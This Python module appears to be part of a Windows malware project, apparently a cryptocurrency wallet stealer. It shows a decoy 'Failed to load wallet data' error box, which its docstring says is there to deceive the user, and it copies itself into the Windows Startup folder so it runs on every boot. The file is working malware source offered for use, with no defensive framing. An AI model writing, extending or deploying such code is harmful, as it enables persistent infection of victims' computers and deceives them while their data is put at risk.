"""
Module: System Operations (Persistence & Camouflage)
Description: Handles OS-level interactions including hiding the process, 
             establishing persistence via Startup folder, and displaying decoy messages.
"""

import os
import shutil
import sys
import ctypes

def show_fake_error():
    """
    Displays a fake error message box to deceive the user.
    Simulates the 'Failed to load wallet data' scenario.
    """
    title = "Wallet Error"
    message = "Failed to load wallet data. Corrupted file structure."
    
    # ctypes.windll.user32.MessageBoxW is the Unicode version of the Win32 API
    #0:this pop-up is a standalone window and doesn't "belong" to any other program.
    #0x10: the "Critical Error" icon (Red X)
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)

def install_persistence():
    """
    Copies the current executable/script to the Windows Startup folder
    to ensure it runs on every boot.
    """
    try:
        # Get the path of the file currently running
        # If frozen (compiled to exe), use executable path. If script(regular .py), use script path.
        if getattr(sys, 'frozen', False):
            current_file = sys.executable
        else:
            current_file = os.path.abspath(sys.argv[0])

        exe_name = os.path.basename(current_file)

        # Locate the Windows Startup folder
        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )
        
        destination = os.path.join(startup_folder, exe_name)

        # Check if already exists to avoid overwriting unnecessarily
        if not os.path.exists(destination):
            shutil.copy2(current_file, destination)
            print(f"[DEBUG] Persistence installed: {destination}")
        else:
            print("[DEBUG] Persistence already exists.")
            
    except Exception as e:
        print(f"[ERROR] Failed to install persistence: {e}")